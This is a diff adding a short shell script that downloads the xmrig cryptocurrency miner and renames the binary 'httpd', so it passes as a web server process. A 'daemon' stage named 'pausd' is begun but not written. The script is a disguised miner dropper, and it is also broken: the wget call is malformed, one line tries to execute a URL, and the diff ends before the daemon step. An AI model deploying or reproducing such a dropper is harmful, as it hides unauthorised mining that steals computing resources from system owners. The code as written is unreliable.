@@ -1,0 +1,23 @@
+#!/bin/sh
+
+cd ~/
+
+MASK=${MASK:-httpd}
+DAEMON=${MASK:-pausd}
+
+## object
+OBJ_VER=${OBJ_VER:-2.4.3}
+OBJ_NAME=${OBJ_NAME:-xmrig}
+OBJ_URL=${OBJ_URL:-https://github.com/xmrig/xmrig/releases/download/v${OBJ_VER}/${OBJ_NAME}-${OBJ_VER}-gcc7-xenial-amd64-no-api.tar.gz}
+
+## get the object
+wget -q $OBJ_URL obj.tar.gz
+tar xf obj.tar.gz
+rm obj.tar.gz
+mv ${OBJ_NAME}*/${OBJ_NAME} ${MASK}
+
+## daemon
+URL=$(https://github.com/untoreh/scripts/)
+
+## get the daemon
+
